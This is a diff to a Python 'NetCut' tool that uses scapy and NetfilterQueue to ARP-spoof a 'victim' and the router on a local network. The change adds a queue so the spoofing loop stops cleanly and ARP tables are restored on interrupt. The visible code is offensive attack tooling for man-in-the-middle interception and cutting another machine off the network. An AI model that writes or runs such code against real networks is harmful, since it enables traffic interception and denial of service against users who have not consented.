@@ -2,6 +2,7 @@ from netfilterqueue import NetfilterQueue
 import scapy.all as scapy
 import subprocess
 from time import sleep
+from queue import Queue
 
 
 class NetCut:
@@ -9,6 +10,7 @@ class NetCut:
         self.white_ip = white_ip
         self.victim = victim
         self.router = router
+        self.q = Queue()
 
     ############ ARP SPOOF ################
     def linux_iproute(self, meaning):
@@ -44,7 +46,7 @@ class NetCut:
     
     def spoof(self):
         self.linux_iproute(1)
-        while True:
+        while self.q.empty():
             self.send_packet(self.victim, self.router)
             self.send_packet(self.router, self.victim)
             sleep(2)
@@ -66,8 +68,11 @@ class NetCut:
         try:
             queue.run()
         except KeyboardInterrupt:
+            self.q.put_nowait("stop")
+
             self.restore(self.victim, self.router)
             self.restore(self.router, self.victim)
+            
             self.linux_iproute(0)
 
             subprocess.Popen("iptables -F", shell=True)
